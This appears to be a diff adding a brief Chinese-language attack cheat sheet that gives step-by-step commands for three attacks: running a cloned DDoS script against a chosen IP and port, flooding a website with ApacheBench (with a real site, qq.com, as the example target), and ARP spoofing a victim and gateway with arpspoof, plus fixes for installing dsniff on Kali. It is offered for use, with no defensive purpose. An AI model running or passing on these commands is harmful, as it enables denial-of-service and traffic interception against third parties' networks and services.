@@ -1,0 +1,53 @@
+
+【DDOS】
+git clone https://github.com/Andysun06/ddos
+
+cd ddos
+
+python ddos-p2.py
+
+输入IP
+Attack Port   攻击端口，一般服务器默认为80
+Attack Speed  攻击速度，数值越大越快，最大不能超过1000
+
+
+【CC】
+
+
+ab -n 参数1 -c 参数2 网站地址
+
+参数一是并发数（请求的用户量）
+参数二是发送总量（请求的总次数）
+
+
+ab -n 1000  -c 1000  https://www.qq.com/aa/
+
+
+【ARP欺骗】
+
+apt-get install dsniff
+
+fping -g  192.168.124.1/24 
+
+arpspoof -i eth0 -t 192.168.0.100 192.168.0.1   
+                                 靶机                     网关
+
+vim /etc/apt/sources.list
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+如果 apt-get install dsniff 报错
+
+① 添加阿里镜像
+deb https://mirrors.aliyun.com/kali kali-rolling main non-free contrib
+deb-src https://mirrors.aliyun.com/kali kali-rolling main non-free contrib
+
+② 更新
+apt-get update
+
+③ 安装
+apt-get install dsniff
+
+
+
+
